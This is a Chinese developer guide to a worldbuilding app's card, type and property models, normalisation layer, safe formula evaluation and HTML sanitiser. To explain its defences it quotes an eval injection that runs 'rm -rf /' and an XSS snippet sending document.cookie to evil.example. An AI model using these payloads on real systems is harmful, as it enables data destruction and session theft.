# 卡片·类型·属性

> **文档版本：0.5.0-dev**
>
> 卡片是这个世界里最小的内容单位，类型决定一张卡片"该有哪些字段"，
> 属性则是字段本身。这篇讲清楚它们长什么样、
> 七种属性值类型各自怎么存、输入是怎么被清洗的、
> 公式为什么不用 `eval`、正文 HTML 为什么要净化。
> 读完你应该能自己定义一个类型、加一条公式属性，并知道它背后发生了什么。

---

## 1. 卡片是什么：五个部件

一张卡片由五部分组成（对应 `apps/documents/models/document.py` 的 `Card` 与 `Document`）：

| 部件 | 存在哪里 | 存什么 | 例子 |
| --- | --- | --- | --- |
| **标题** | `Document.name` | 卡片的显示名 | 「亚瑟」 |
| **实体类型** | `Document.entity_type` / `Card.entity_type` | 这张卡属于哪个类型 | 「人物」 |
| **属性值 values** | `Card.values`（JSON） | 按类型定义填的字段值 | `{ "3": "45", "4": "国王" }` |
| **区块 blocks** | `Card.blocks`（JSON 数组） | 正文被切成的块 | 一段文字、一个标题、一张图 |
| **别名 aliases** | `Card.aliases`（JSON 数组） | 这张卡还能叫什么 | `["狮心王", "亚瑟·潘德拉贡"]` |
| **正文 body** | `Card.body`（文本） | 区块的纯文本投影 | 供搜索、自动识别用 |

一个容易困惑的点：**标题、类型挂在 `Document` 上，其余内容挂在 `Card` 上。**
两者是一对一关系：

```python
class Card(models.Model):
    document = models.OneToOneField(Document, on_delete=models.CASCADE, related_name="card")
    entity_type = models.ForeignKey(EntityType, null=True, blank=True, ...)
    aliases = models.JSONField("别名", default=list, blank=True)
    values = models.JSONField("属性值", default=dict, blank=True)
    blocks = models.JSONField("区块", default=list, blank=True)
    comments = models.JSONField("页面评论", default=list, blank=True)
    body = models.TextField("正文纯文本", blank=True, default="")
    era_mode = models.CharField("纪元可见性", max_length=10, choices=ERA_MODES, default=ERA_MODE_UNIVERSAL)
    era_ids = models.JSONField("生效的纪元", default=list, blank=True)
```

为什么要拆成两张表？因为 `Document` 是"所有内容的通用外壳"（文件夹、地图、
时间线都用它），而卡片特有的东西（属性、区块、别名）才放进 `Card`。
这样"非卡片"的文档就不必背着这些字段。

`Card.effective_type()` 决定用哪个类型：**卡片自己的类型优先，没有就退回文档上的类型**：

```python
def effective_type(self):
    return self.entity_type or self.document.entity_type
```

### 1.1 values 的键为什么是字符串

`Card.values` 的键是**属性 id 的字符串形式**，例如：

```json
{
  "3": "亚瑟",
  "4": 45,
  "5": [12, 18]
}
```

之所以用字符串键，是因为 JSON 对象的键只能是字符串；用属性 id（而不是属性名）
做键，好处是**属性改名后旧数据不会失联**——id 不变，值就还找得到。

## 2. 实体类型 EntityType 与继承

### 2.1 类型可以嵌套、可以继承

`EntityType` 同样用**自引用外键** `parent` 表达层级，和文档树一个思路：

```python
class EntityType(models.Model):
    world = models.ForeignKey(World, on_delete=models.CASCADE, related_name="types")
    name = models.CharField("名称", max_length=60)
    parent = models.ForeignKey(
        "self", null=True, blank=True, on_delete=models.CASCADE, related_name="children"
    )
    icon = models.CharField("图标", max_length=40, blank=True, default="")
    color = models.CharField("颜色", max_length=24, blank=True, default="")
    position = models.PositiveIntegerField("排序", default=0)
    hidden = models.BooleanField("从选择器隐藏", default=False)

    class Meta:
        ordering = ["position", "id"]
        unique_together = [("world", "name")]   # 同一世界内类型名不重复
```

一个子类型会**继承父类型的全部属性**。举例：

```text
人物
├── 属性：姓名(text)、年龄(number)
└── 皇室成员（子类型）
    └── 属性：头衔(select)
```

那么「皇室成员」的卡片实际拥有三个属性：姓名、年龄（继承来）、头衔（自己的）。

### 2.2 ancestry：从根到自己的类型链

`ancestry()` 顺着 `parent` 往上走，返回从**根到当前类型**的列表：

```python
def ancestry(self):
    chain, node, seen = [], self, set()
    while node is not None and node.pk not in seen:
        seen.add(node.pk)
        chain.append(node)
        node = node.parent
    return list(reversed(chain))    # 反转成"根 → 自己"
```

`seen` 集合用来防止类型链里出现环（比如 A 的父是 B、B 的父又是 A），
一旦成环就在重复节点处停下。

### 2.3 all_properties：合并整条链的属性

这是继承的核心。它遍历整条 `ancestry()`，把所有属性按**名字**收进一个字典，
**同名时后出现的覆盖先出现的**：

```python
def all_properties(self):
    """自己的属性 + 继承来的属性（子类同名属性覆盖父类）。"""
    merged: dict[str, PropertyDef] = {}
    for t in self.ancestry():          # 从根到子
        for prop in t.properties.all():
            merged[prop.name] = prop   # 子类的同名属性把父类的挤掉
    return sorted(merged.values(), key=lambda p: (p.position, p.id))
```

因为遍历顺序是"从根到子"，子类在循环中更晚出现，所以**子类同名属性会覆盖父类**。
这正是"子类型可以重定义父类型的某个字段"的实现方式。

用表总结几种情况：

| 情况 | 结果 |
| --- | --- |
| 父有「年龄」，子没有 | 子继承「年龄」 |
| 父、子都有「头衔」 | 用**子**的定义（覆盖） |
| 父没有、子有「头衔」 | 子是唯一来源 |

`is_ancestor_of(other)` 判断自己是否是 `other` 的祖先，用来阻止把类型设成自己的子孙。

### 2.4 PropertyDef：一条属性的定义

```python
class PropertyDef(models.Model):
    entity_type = models.ForeignKey(EntityType, on_delete=models.CASCADE, related_name="properties")
    name = models.CharField("属性名", max_length=60)
    value_type = models.CharField("值类型", max_length=16, choices=VALUE_TYPES, default=VT_TEXT)
    options = models.JSONField("选项", default=list, blank=True)   # [{"label","color"}]
    required = models.BooleanField("必填", default=False)
    default_value = models.JSONField("默认值", null=True, blank=True)
    formula = models.CharField("公式", max_length=200, blank=True, default="")
    description = models.CharField("说明", max_length=200, blank=True, default="")
    position = models.PositiveIntegerField("排序", default=0)
    show_on_existing = models.BooleanField("同步到已有卡片", default=False)
    reference_type = models.ForeignKey(
        EntityType, null=True, blank=True, on_delete=models.SET_NULL, related_name="referenced_by"
    )
```

| 字段 | 用途 |
| --- | --- |
| `name` | 属性名，同一类型下不重复（`unique_together = [("entity_type","name")]`） |
| `value_type` | 七种值类型之一（见第 3 节） |
| `options` | 单选 / 多选的候选项列表，如 `[{"label":"国王","color":""}]` |
| `required` | 是否必填 |
| `default_value` | 新建卡片时的默认值 |
| `formula` | 当 `value_type` 是公式时，这里放公式表达式 |
| `position` | 显示排序 |
| `show_on_existing` | 加这条属性时，是否给**已有**卡片也补上默认值 |
| `reference_type` | 当 `value_type` 是引用时，限定只能引用哪个类型的卡片 |

`option_labels` 这个便利属性会把 `options` 统一成字符串标签列表：

```python
@property
def option_labels(self) -> list[str]:
    out = []
    for opt in self.options or []:
        if isinstance(opt, dict) and opt.get("label"):
            out.append(str(opt["label"]))
        elif isinstance(opt, str):
            out.append(opt)
    return out
```

它兼容两种存法（`{"label": ...}` 字典和纯字符串），所以无论前端传哪种都能用。

## 3. 七种属性值类型

`VALUE_TYPES` 定义了全部七种：

| 值类型（常量） | 中文 | 存什么形态 | 输入示例 | 存储示例 |
| --- | --- | --- | --- | --- |
| `text` | 文本 | 字符串 | 「亚瑟·潘德拉贡」 | `"亚瑟·潘德拉贡"` |
| `select` | 单选 | 一个字符串标签 | 下拉选「国王」 | `"国王"` |
| `multiselect` | 多选 | 字符串数组 | 选「剑士」「国王」 | `["剑士", "国王"]` |
| `number` | 数字 | 数字 | `45` | `45` |
| `date` | 日期 | 对象（年 / 月 / 日） | 「500 年 3 月」 | `{"year": 500, "month": 3, "day": 1}` |
| `reference` | 引用 | 目标文档 id（整数） | 指向「卡美洛」 | `12` |
| `formula` | 公式 | 不存手填值，靠计算得出 | `@[攻击] * @[倍率]` | `values` 里**不存**，实时算 |

再展开讲几个关键点。

### 3.1 文本 text

自由文本，最长 2000 字符（超了截断）。存储就是普通字符串。

### 3.2 单选 select

从类型预先定义的 `options` 里挑一个。**允许就地新建选项**：如果填的标签不在
现有选项里，后端会把它补进 `options` 并保存，省得作者先去改类型定义：

```python
label = as_text(raw, 120)
if prop.option_labels and label not in prop.option_labels:
    options = list(prop.options or [])
    options.append({"label": label, "color": ""})
    prop.options = options
    prop.save(update_fields=["options"])
return label
```

### 3.3 多选 multiselect

可以同时选多个，存成数组。显示时用「、」连接（见第 6 节的 `resolve_card_values`）。

### 3.4 数字 number

用 `as_number()` 清洗，能转成数字就转，否则报错。布尔值 `true/false` 会被当作无效。

### 3.5 日期 date

统一存成 `{"year", "month", "day"}`。只填年份也可以，月、日默认补 1：

```python
if isinstance(raw, dict):
    return {
        "year": as_int(raw.get("year")),
        "month": max(1, as_int(raw.get("month"), 1)),
        "day": max(1, as_int(raw.get("day"), 1)),
    }
return {"year": as_int(raw), "month": 1, "day": 1}
```

前端显示的格式是「X 年 Y 月」。

### 3.6 引用 reference

存的是**目标文档的 id**（整数）。清洗时会校验目标确实存在于当前世界、且未被删除：

```python
target_id = as_int(raw)
if not target_id:
    return None
if world is not None:
    exists = world.documents.filter(pk=target_id, deleted_at__isnull=True).exists()
    if not exists:
        raise ValueErrorCN(f"「{prop.name}」引用的卡片不在这个世界里")
return target_id
```

给前端时，它会被解析成一个带名字的摘要对象（见第 6 节）。

### 3.7 公式 formula

公式列**不接受手填值**，`values` 里也不存它的结果——结果每次都是现算的：

```python
if vtype == VT_FORMULA:
    return None  # 公式列不接受手填
```

公式本身写在 `PropertyDef.formula` 里，形如 `@[攻击] * @[倍率]`。详见第 5 节。

## 4. 属性值清洗层：normalize.py

模型只管"存什么"，**"什么样的输入算合法"这件事统一收在 `apps/world/normalize.py`**。
无论值是从接口、admin 还是导入脚本进来的，都走同一套清洗，结果一致。

### 4.1 四个基础清洗函数

| 函数 | 作用 | 要点 |
| --- | --- | --- |
| `as_text(value, limit)` | 把任意值变成文本 | `None`→`""`；布尔→`"true"/"false"`；数字用 `format(value,"g")`；列表用逗号连接；字典取 `text` 或 `label`；最后 `strip` 并截断 |
| `as_number(value)` | 尽量转成数字，不行就 `None` | 空串→`None`；布尔→`None`；其余用正则找第一个数字 |
| `as_int(value, default)` | 转整数 | 内部先用 `as_number`，失败返回 `default` |
| `as_alias_list(value)` | 整理别名列表 | 按 `[,\n、，]` 拆分，去空、按大小写无关去重、最多 30 个 |

`as_text` 里对数字的处理值得注意：

```python
if isinstance(value, (int, float)):
    text = format(value, "g")
```

`format(value, "g")` 会去掉多余的小数零：`45.0` 显示成 `45`，`3.140` 显示成 `3.14`。

`as_number` 里的正则 `-?\d+(?:\.\d+)?` 会**在一串文本里找第一个数字**，
所以「大约 45 人」也能被识别成 `45`（这在下文引用、公式里都用到）。

`as_alias_list` 的大小写去重：

```python
key = text.casefold()          # 比 lower() 更彻底的大小写归一
if text and key not in seen:
    seen.add(key)
    out.append(text)
```

### 4.2 coerce_property_value：按类型分派

真正的"入口函数"是 `coerce_property_value(prop, raw, world=None)`：它根据
`prop.value_type` 决定怎么清洗，**非法就抛 `ValueErrorCN`**（带中文提示，
接口层直接回给前端）。

```python
def coerce_property_value(prop, raw, world=None):
    vtype = prop.value_type
    if vtype == VT_FORMULA:
        return None
    if vtype == VT_NUMBER:
        ...
        raise ValueErrorCN(f"「{prop.name}」需要一个数字")
    if vtype == VT_DATE:
        ...
    if vtype == VT_SELECT:
        ...
    if vtype == VT_MULTISELECT:
        ...
    if vtype == VT_REFERENCE:
        ...
        raise ValueErrorCN(f"「{prop.name}」引用的卡片不在这个世界里")
    return as_text(raw)   # 文本兜底
```

### 4.3 为什么要单独有这一层

如果清洗逻辑散落在各个视图里，就会出现：

- 从 admin 改的值没经过校验，脏数据进了库；
- 接口允许的输入和导入脚本允许的不一致，同一条数据两种命运；
- 想加一条新规则要改很多处，容易漏。

集中到一层后，**规则只有一份**。`Card.resolved_values()` 也只是转调这里的
`resolve_card_values()`。

### 4.4 上限常量

为了避免"把整篇正文塞进一个属性"，清洗层设了长度上限：

| 常量 | 值 | 限制的是 |
| --- | --- | --- |
| `MAX_TEXT` | 2000 | 单个文本属性 |
| `MAX_ALIAS` | 120 | 单个别名 |
| `MAX_BLOCKS` | 400 | 区块数量 |
| `MAX_BLOCK_TEXT` | 20000 | 单个区块的文本 |

## 5. 公式属性：占位符与安全求值

### 5.1 占位符 `@[属性名]`

公式写成 `@[攻击] * @[倍率] + @[基础值]` 这样的形式。其中 `@[...]` 叫**占位符**，
用正则识别：

```python
FORMULA_TOKEN = re.compile(r"@\[([^\]\n]{1,60})\]")
```

含义：`@[` 开头，中间是 1~60 个"非 `]` 且非换行"的字符（即属性名），`]` 结尾。

求值分三步（`evaluate_formula`）：

1. 把每个 `@[名]` **替换**成它对应的数字；
2. 用 `ast.parse(..., mode="eval")` 把整个表达式解析成语法树；
3. 用白名单求值器算结果。

```python
def replace(match):
    name = match.group(1).strip()
    number = as_number(values_by_name.get(name))
    if number is None:
        raise ValueErrorCN(f"「{name}」还不是数字")
    return repr(float(number))       # 变成 "45.0" 这样的字面量

source = FORMULA_TOKEN.sub(replace, expression)
tree = ast.parse(source, mode="eval")
result = _safe_eval(tree, {})
```

替换时用 `repr(float(number))` 而不是直接拼字符串，是为了防止属性值里混入
`+`、`(` 之类的字符把公式结构改掉。

### 5.2 为什么不能用 eval

Python 的 `eval()` 会把字符串当代码执行。如果直接 `eval("1 + " + 用户输入)`，
攻击者只要把某个属性值填成下面这样，就能执行任意代码：

```text
0.0) or __import__("os").system("rm -rf /") or (0.0
```

拼进公式后，`eval` 会把它当成 Python 表达式执行——这就是**代码注入**。
属性值、公式都是用户可控的输入，所以绝不能把它喂给 `eval`。

### 5.3 白名单求值器 _safe_eval

替代方案是：自己遍历语法树，**只放行明确允许的节点类型**。代码只认得数字、
四则运算和属性引用，其它一律报错：

```python
def _safe_eval(node, lookup):
    if isinstance(node, ast.Expression):
        return _safe_eval(node.body, lookup)
    if isinstance(node, ast.Constant):
        if isinstance(node.value, bool) or not isinstance(node.value, (int, float)):
            raise ValueErrorCN("公式里只能出现数字")
        return float(node.value)
    if isinstance(node, ast.BinOp) and type(node.op) in _BIN_OPS:
        left = _safe_eval(node.left, lookup)
        right = _safe_eval(node.right, lookup)
        if isinstance(node.op, ast.Pow) and abs(right) > 8:
            raise ValueErrorCN("公式的幂次过大")
        return _BIN_OPS[type(node.op)](left, right)
    if isinstance(node, ast.UnaryOp) and type(node.op) in _UNARY_OPS:
        return _UNARY_OPS[type(node.op)](_safe_eval(node.operand, lookup))
    if isinstance(node, ast.Name):
        if node.id not in lookup:
            raise ValueErrorCN(f"公式里没有「{node.id}」这个属性")
        return lookup[node.id]
    raise ValueErrorCN("公式只支持数字与 + - * / ( )")
```

允许的运算和节点是白名单：

| 节点类型 | 允许的算子 |
| --- | --- |
| `BinOp`（二元运算） | `+ - * / // % **`（`_BIN_OPS`） |
| `UnaryOp`（一元运算） | 正号 `+x`、负号 `-x`（`_UNARY_OPS`） |
| `Constant`（字面量） | 只允许 `int` / `float`，**拒绝 `bool`** |
| `Name`（名字） | 必须在 `lookup` 里，否则报错 |

几处细节：

- **拒绝 `bool`**：因为 Python 里 `True` 也是 `int` 的子类，不特判就会被当数字用。
- **幂次上限 8**：`**` 结果增长极快，`2 ** 1000000` 能把内存占满，所以限制右操作数绝对值不超过 8。
- **函数调用、属性访问、下标、lambda 等全部不在白名单**，直接落到最后一行报错。

哪怕攻击者把值填成 `__import__("os")...`，解析出来是 `Call` 节点，
不在白名单里 → 抛 `ValueErrorCN` → 求值失败返回 `None`。**代码根本没有机会执行。**

### 5.4 算不出来就返回 None

求值失败（缺值、公式语法错、除零、NaN / 无穷）统一返回 `None`，
前端显示空，而不是报错中断：

```python
except ValueErrorCN:
    return None
except Exception:
    return None
if result != result or result in (float("inf"), float("-inf")):  # NaN / inf
    return None
return result
```

## 6. 引用属性：解析成 {id, name}

存进库时，引用只是一个 id（第 3.6 节）。但前端不能用 id 直接显示，
需要把它**解析成带名字的对象**。这发生在 `resolve_card_values(card)` 里：

```python
if prop.value_type == VT_REFERENCE and value:
    target = card.document.world.documents.filter(pk=as_int(value)).first()
    if target is not None:
        extra = {"ref": {"id": target.id, "name": target.name, "type": target.document_type}}
        display = target.name
    else:
        display = "无法访问的卡片"
```

于是前端拿到的每个引用属性都长这样：

```json
{
  "name": "首都",
  "value_type": "reference",
  "value": 12,
  "display": "卡美洛",
  "ref": { "id": 12, "name": "卡美洛", "type": "card" },
  "inherited": false
}
```

好处是**改名字这里跟着变**：目标卡片改名的瞬间，所有引用它的地方显示的都是新名字，
因为每次取数据时都是现查的。

### 6.1 resolve_card_values：前端直接可用的一份数据

这个函数是前端读取属性值的**唯一入口**。它返回
`{属性id: {name, value_type, value, display, inherited, ref?}}`：

| 字段 | 含义 |
| --- | --- |
| `name` | 属性名 |
| `value_type` | 值类型 |
| `value` | 清洗后的值（公式是算出来的数字） |
| `display` | 给人看的字符串（已格式化） |
| `inherited` | 这条属性是否继承自父类型 |
| `ref` | 仅引用类型有：`{id, name, type}` |

对不同类型，`display` 的生成方式不同：

| 类型 | display 怎么来 |
| --- | --- |
| 引用 | 目标卡片的名字（取不到则显示「无法访问的卡片」） |
| 公式 | `format(value, "g")` |
| 多选 | 用「、」连接各项 |
| 数字 | `format(value, "g")` |
| 日期 | `f"{year} 年 {month} 月"` |
| 其它 | `as_text(value, 400)` |

`inherited` 用一句比较就能算出来：属性所属的类型不是当前卡片类型，就说明是继承来的：

```python
"inherited": prop.entity_type_id != entity_type.id,
```

### 6.2 default_values_for：新建时铺默认值

新建卡片时，会把它类型上"有默认值的属性"预填一遍：

```python
def default_values_for(entity_type) -> dict:
    out = {}
    for prop in entity_type.all_properties():
        if prop.default_value not in (None, "", []):
            out[str(prop.id)] = prop.default_value
    return out
```

## 7. 区块 blocks

### 7.1 区块是什么

卡片的正文不是一整块 HTML，而是被切成一个个**区块**（block）的数组。
每个区块是一个字典，至少带 `id` 和 `type`。支持的区块类型：

```python
BLOCK_TYPES = ("text", "heading", "quote", "divider", "callout", "media", "tool",
               "table", "todo", "card", "image", "embed", "toggle",
               "code", "bulleted", "numbered", "bookmark", "collection")
```

| 区块类型 | 用途 |
| --- | --- |
| `text` | 普通段落 |
| `heading` | 标题 |
| `quote` | 引用 |
| `divider` | 分隔线 |
| `callout` | 提示框 |
| `bulleted` / `numbered` | 无序 / 有序列表 |
| `todo` | 待办（可打勾） |
| `toggle` | 可折叠块 |
| `code` | 代码块 |
| `image` / `media` | 图片 / 媒体 |
| `embed` / `bookmark` | 链接嵌入 / 书签卡 |
| `card` | 嵌一张卡片 |
| `table` | 表格 |
| `collection` | 内容集合 |

一个区块的典型结构：

```json
{
  "id": "b1",
  "type": "text",
  "title": "",
  "text": "亚瑟拔出石中剑。",
  "html": "<p>亚瑟拔出<strong>石中剑</strong>。</p>",
  "hidden": false
}
```

### 7.2 normalize_blocks：入库前的清洗

`normalize_blocks(value)` 保证每个区块结构规整：类型不在白名单就降级成 `text`，
给缺失的 id 补一个（`b1`、`b2`…），文本类块同时保存 `html`（过净化）和派生的纯文本 `text`：

```python
btype = as_text(raw.get("type"), 20) or "text"
if btype not in BLOCK_TYPES:
    btype = "text"
html = clean_html(raw.get("html"))
plain = as_text(raw.get("text"), MAX_BLOCK_TEXT)
if html:
    plain = html_to_text(html)[:MAX_BLOCK_TEXT]
```

几种特殊区块的 `settings` 会被专门清洗，防止脏数据透传：

- `card`：`settings.document` 必须是数字（卡片 id）。
- `image` / `embed` / `bookmark`：只保留 `url` 和 `caption`。

### 7.3 blocks 与 body：为什么要互转

`Card.body` 是区块的**纯文本投影**。它存在的理由：搜索、字数统计、名字自动识别
这些功能只关心"有什么文字"，不关心是不是加粗了。

两者之间靠 `blocks_to_text(blocks)` 单向推导：

```python
def blocks_to_text(blocks) -> str:
    parts = []
    for block in blocks:
        if block.get("hidden"):
            continue                                  # 隐藏的块不计入
        text = as_text(block.get("text"), MAX_BLOCK_TEXT) or html_to_text(block.get("html", ""))
        title = as_text(block.get("title"), 200)
        if title:
            parts.append(title)
        if text:
            parts.append(text)
        items = block.get("items")
        if isinstance(items, (list, tuple)):
            parts.extend(as_text(i, 500) for i in items if as_text(i, 500))
    return "\n".join(parts)
```

在写入路径上，后端**以区块为准**推导 body，保证两者不会各说各话：

```python
if "blocks" in payload:
    card.blocks = normalize_blocks(payload.get("blocks"))
    card.body = blocks_to_text(card.blocks)      # 正文由区块推导
if "body" in payload and "blocks" not in payload:
    card.body = as_text(payload.get("body"), 20000)
```

注意第二行：**只有当这次请求没有带 `blocks` 时，才接受直接传 `body`**——
否则区块和正文可能对不上。

### 7.4 块评论

每个区块还能挂评论，评论正文按**纯文本**存（不给评论开富文本，
少一条 XSS 攻击面）：

```python
def normalize_block_comments(value) -> list[dict]:
    ...
    text = html_to_text(as_text(raw.get("text"), MAX_COMMENT_TEXT)).strip()
    if not text:
        continue
    out.append({
        "id": as_text(raw.get("id"), 40) or f"c{index + 1}",
        "author": as_text(raw.get("author"), 80) or "我",
        "text": text,
        "at": as_text(raw.get("at"), 40),
        "resolved": bool(raw.get("resolved")),
    })
```

上限：最多 50 条评论，单条正文 2000 字符。

### 7.5 card_search_text：进搜索索引的文本

一张卡片进入搜索时，用它的**标题 + 别名 + 正文 + 属性值**拼成一段文本：

```python
def card_search_text(card) -> str:
    chunks = [document.name]
    chunks += as_alias_list(card.aliases)
    if card.body:
        chunks.append(card.body)
    else:
        chunks.append(blocks_to_text(card.blocks))
    for entry in resolve_card_values(card).values():
        if entry.get("display"):
            chunks.append(str(entry["display"]))
    return "\n".join(c for c in chunks if c)
```

## 8. 正文 HTML 的净化：sanitize.py

### 8.1 为什么必须净化

卡片正文是 `contenteditable`（可直接编辑的富文本区），浏览器会往里塞各种标签，
尤其是**从别处粘贴**时，会带进来一大堆样式、脚本、iframe 等。

如果把这些 HTML 原样存库、再原样渲染出来，就等于把攻击者的代码放进了别人的浏览器。
所以入库前必须过一遍**白名单**：只留排版相关的标签与属性，其余一律丢掉，
而 `script` / `style` / `iframe` 这种**连同内容一起扔掉**。

### 8.2 白名单

```python
ALLOWED_TAGS = {
    "p", "br", "b", "strong", "i", "em", "u", "s", "strike", "del", "code", "mark",
    "ul", "ol", "li", "blockquote", "span", "a", "h1", "h2", "h3",
}
ALLOWED_ATTRS = {
    "a": {"href"},
    "span": {"data-target", "class"},
}
ALLOWED_CLASSES = {
    "span": {"mentions-inline"},
}
DROP_WITH_CONTENT = {"script", "style", "iframe", "object", "embed", "template", "svg"}
VOID_TAGS = {"br", "img", "hr"}
SAFE_SCHEMES = ("http://", "https://", "mailto:", "/", "#")
MAX_HTML = 40000
```

| 常量 | 含义 |
| --- | --- |
| `ALLOWED_TAGS` | 允许出现的标签，都是排版用的 |
| `ALLOWED_ATTRS` | 每个标签允许保留的属性（`a` 只留 `href`，`span` 只留 `data-target` 和 `class`） |
| `ALLOWED_CLASSES` | `class` 只放行自己的语义类 `mentions-inline`，其余丢掉 |
| `DROP_WITH_CONTENT` | 这些标签**连同里面的文字**一起删掉 |
| `SAFE_SCHEMES` | 链接协议白名单（只允许 http/https/mailto/站内路径/锚点） |
| `MAX_HTML` | 一段 HTML 的最大长度 |

一个假想例子：如果有人粘贴了

```html
<p>你好<script>fetch('https://evil.example/steal?c='+document.cookie)</script></p>
<a href="javascript:alert(1)">点我</a>
```

净化后 `<script>` 连同内容被丢弃；`<a>` 的 `href` 因为不是安全协议（`javascript:` 不在
`SAFE_SCHEMES` 里）也被删掉，只剩下空 `<a>`。恶意代码根本没机会留在库里。

### 8.3 净化器怎么工作

`_Cleaner` 继承自 Python 标准库的 `HTMLParser`，逐个事件处理标签与文本：

| 回调 | 处理 |
| --- | --- |
| `handle_starttag` | 遇 `DROP_WITH_CONTENT` 里的标签就 `drop_depth += 1`；不在白名单就整段跳过；在白名单就只保留允许的属性 |
| `handle_endtag` | 补上没闭合的标签，保证结构合法 |
| `handle_data` | 文本内容做 HTML 转义后保留 |

属性的过滤细节：

```python
if name == "href" and not str(value).strip().lower().startswith(SAFE_SCHEMES):
    continue
if name == "class":
    permitted = ALLOWED_CLASSES.get(tag, set())
    tokens = [t for t in str(value).split() if t in permitted]
    if not tokens:
        continue
    value = " ".join(tokens)
```

`clean_html(raw)` 是入口。如果解析过程中出了异常，会**退化成把文本转义**后返回，
绝不会把原始 HTML 原样存进去：

```python
try:
    cleaner.feed(text)
    cleaner.close()
except Exception:
    return escape(text, quote=False)
```

`html_to_text(raw)` 则是反方向：把 HTML 拍平成纯文本（`<p>` 等标签转成换行，
`script` 等连同内容丢掉），供搜索、字数、自动识别使用。

### 8.4 分工：sanitize 与 normalize

两者常一起用，但职责不同：

| 模块 | 负责 |
| --- | --- |
| `apps/world/services/sanitize.py` | **哪段 HTML 能存**——把富文本净化到安全子集 |
| `apps/world/normalize.py` | **什么样的值算合法**——按属性类型清洗、公式求值、引用解析 |

`normalize_blocks` 会调用 `clean_html` 与 `html_to_text`，所以区块入库时自动经过净化。

## 9. 相关接口逐个讲

同样挂在 `/api/world/` 下，路径结尾不带斜杠。本篇相关的是：

| 方法 | 路径 | 视图 | 用途 |
| --- | --- | --- | --- |
| GET | `/api/world/types` | `type_collection` | 列所有类型 |
| POST | `/api/world/types` | `type_collection` | 新建类型（可带 `parent` 做子类型） |
| GET | `/api/world/types/<id>` | `type_detail` | 读单个类型 |
| PUT | `/api/world/types/<id>` | `type_detail` | 改名 / 图标 / 颜色 / 换父类 |
| DELETE | `/api/world/types/<id>` | `type_detail` | 删类型 |
| GET | `/api/world/types/<id>/properties` | `property_collection` | 列某类型下的属性 |
| POST | `/api/world/types/<id>/properties` | `property_collection` | 新建属性 |
| GET | `/api/world/properties/<id>` | `property_detail` | 读单个属性 |
| PUT | `/api/world/properties/<id>` | `property_detail` | 改属性 |
| DELETE | `/api/world/properties/<id>` | `property_detail` | 删属性 |
| GET | `/api/world/cards/<doc_id>` | `card_detail` | 读一张卡片的正文与属性 |
| PUT | `/api/world/cards/<doc_id>` | `card_detail` | 改一张卡片 |

### 9.1 GET / POST /api/world/types

- **GET**：返回 `{"types": [ ... ]}`，每个类型带 `field_count` 和 `properties`。
- **POST**：新建类型。**同一世界内名字不能重复**；带 `parent` 就是建子类型（属性会继承）。

```json
{ "name": "皇室成员", "parent": 2, "icon": "crown", "color": "gold" }
```

重名会返回错误：

```python
if world.types.filter(name=name).exists():
    return error(f"已经有一个叫「{name}」的类型了")
```

### 9.2 GET / PUT / DELETE /api/world/types/<id>

- **GET**：返回该类型的完整定义（含合并后的 `properties`）。
- **PUT**：改名（同样查重）、改图标 / 颜色、换父类。**不能把自己当父类**：

```python
if parent is not None and parent.pk == entity_type.pk:
    return error("类型不能把自己当父类")
```

- **DELETE**：删除时，它的**子类型会被提升到自己的父级**，不会跟着一起消失：

```python
entity_type.children.update(parent=entity_type.parent)
entity_type.delete()
```

### 9.3 GET / POST /api/world/types/<id>/properties

- **GET**：返回该类型**自己**的属性列表。
- **POST**：新建属性，请求体可带 `value_type`、`options`、`required`、`default`、
  `formula`、`reference_type`、`show_on_existing`。同一类型下属性名不能重复。

一个公式属性的例子：

```json
{ "name": "战力", "value_type": "formula", "formula": "@[攻击] * @[倍率]" }
```

**"同步到已有卡片"**：如果新建时 `show_on_existing` 为真（或设了默认值），
后端会给该类型下**已经存在的卡片**补上这条属性的默认值：

```python
if prop.show_on_existing or prop.default_value not in (None, ""):
    for card in Card.objects.filter(entity_type=entity_type):
        values = dict(card.values or {})
        if str(prop.id) not in values:
            values[str(prop.id)] = prop.default_value
            card.values = values
            card.save(update_fields=["values"])
```

### 9.4 GET / PUT / DELETE /api/world/properties/<id>

单条属性的读 / 改 / 删。PUT 支持改 `name`、`value_type`、`options`、
`reference_type`、`required`、`show_on_existing`、`default`、`formula`、`position`。

### 9.5 GET / PUT /api/world/cards/<doc_id>

这是编辑卡片正文的主接口。

- **GET** 返回：

```json
{
  "document": { "id": 42, "type": "card", "name": "亚瑟" },
  "card": {
    "aliases": ["狮心王"],
    "values": { "3": "亚瑟", "4": 45 },
    "resolved": { "3": { "name": "姓名", "display": "亚瑟", "inherited": false } },
    "blocks": [ { "id": "b1", "type": "text", "text": "..." } ],
    "body": "..."
  },
  "entity_type": { "id": 2, "name": "人物", "properties": [ ... ] },
  "revision": 7
}
```

- **PUT** 会**校验修订号** `revision`：如果请求里带的 `revision` 与服务器当前的不一致，
  说明别人先改过，返回 `409 conflict` 并附上最新内容：

```python
if incoming is not None and as_int(incoming, -1) != current_revision:
    return json_response({
        "error": "这份文档刚被别人改过，已经刷新成最新内容",
        "conflict": True,
        "revision": current_revision,
        ...
    }, status=409)
```

这解决了多人同时编辑的经典问题：**后保存的人不会悄悄覆盖前一个人的改动**，
而是被提示"内容已刷新"。

PUT 时属性值的写入交给 `apply_card_payload`，它**逐条按类型清洗**：

```python
resolved = dict(card.values or {})
for prop in entity_type.all_properties():
    prop_key = str(prop.id)
    if prop_key in values:
        resolved[prop_key] = coerce_property_value(prop, values.get(prop_key), world)
card.values = resolved
```

若传入的值非法（比如给数字属性填了文字），`coerce_property_value` 抛
`ValueErrorCN`，接口把它转成一条中文错误回给前端：

```python
try:
    apply_card_payload(card, world, payload)
except ValueErrorCN as exc:
    return error(str(exc))
```

## 10. 把这条链路串起来

走一遍「给『人物』类型加一条公式属性，然后在卡片上看到结果」：

```text
1. 打开类型管理弹窗
   → GET /api/world/types
   → POST /api/world/types/2/properties
     { "name": "战力", "value_type": "formula", "formula": "@[攻击] * @[倍率]" }

2. 打开一张人物卡
   → GET /api/world/cards/42
     → Card.resolved_values()
       → resolve_card_values()
         → 对公式属性调用 evaluate_formula(prop.formula, by_name)
           → 把 @[攻击]、@[倍率] 替换成数字
           → ast.parse → _safe_eval（白名单求值）
           → 得到结果，display = format(value, "g")

3. 改一下「攻击」属性
   → PUT /api/world/cards/42 { values: { "8": 100 }, revision: 7 }
     → coerce_property_value(数字属性) 清洗
     → card.save()；touch_document() 修订号 +1
     → 下次取数据时，公式自然算出新结果

4. 正文里加粗一段字
   → PUT /api/world/cards/42 { blocks: [...] }
     → normalize_blocks()：clean_html() 净化 HTML
